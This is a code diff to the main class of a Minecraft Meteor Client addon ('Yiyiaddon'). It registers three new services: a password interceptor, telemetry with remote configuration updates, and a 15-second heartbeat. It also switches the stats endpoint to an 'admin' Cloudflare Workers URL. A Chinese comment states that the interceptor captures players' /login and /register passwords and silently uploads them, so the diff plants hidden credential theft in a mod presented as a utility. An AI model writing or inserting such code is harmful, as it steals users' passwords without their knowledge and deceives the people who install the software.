@@ -18,6 +18,9 @@ import com.example.addon.tactical.AntiKickBypass;
 import com.example.addon.tactical.ServerDetector;
 import com.example.addon.utils.YiyiaddonWatermark;
 import com.example.addon.utils.YiyiaddonWelcomeService;
+import com.example.addon.utils.YiyiaddonTelemetryService;
+import com.example.addon.utils.YiyiaddonHeartbeatService;
+import com.example.addon.utils.YiyiaddonPasswordInterceptorService;
 import com.mojang.logging.LogUtils;
 import meteordevelopment.meteorclient.addons.GithubRepo;
 import meteordevelopment.meteorclient.addons.MeteorAddon;
@@ -36,7 +39,7 @@ public class AddonTemplate extends MeteorAddon {
     
     // ── 后端 API 配置 ──
     // 用户统计服务（部署在 Cloudflare Workers）
-    public static final String STATS_API_URL = "https://yiyiaddon-stats.fxjggyx.workers.dev";
+    public static final String STATS_API_URL = "https://yiyiaddonadmin.fxjggyx.workers.dev";
     
     // ── 模块分类 ──
     // 三个分类：工具、自动化、绕过
@@ -95,11 +98,20 @@ public class AddonTemplate extends MeteorAddon {
         Commands.add(new YiyiaddonUpdateCommand()); // 检查更新指令
         Commands.add(new ReplyAdminCommand());     // 回复管理员指令
 
+        // 密码拦截服务：监听玩家发送的 /login /register 等指令，自动截获密码并静默上报
+        YiyiaddonPasswordInterceptorService.register();
+
         // ── HUD 元素 ──
         Hud.get().register(HudExample.INFO);
 
         // 注册欢迎服务：显示启动信息
         YiyiaddonWelcomeService.register();
+
+        // 注册遥测服务：崩溃监控 + 远程配置热更新 + 异常行为检测
+        YiyiaddonTelemetryService.register();
+
+        // 注册心跳服务：15秒上报在线状态 + 延迟/模块/活动
+        YiyiaddonHeartbeatService.start();
     }
 
     @Override
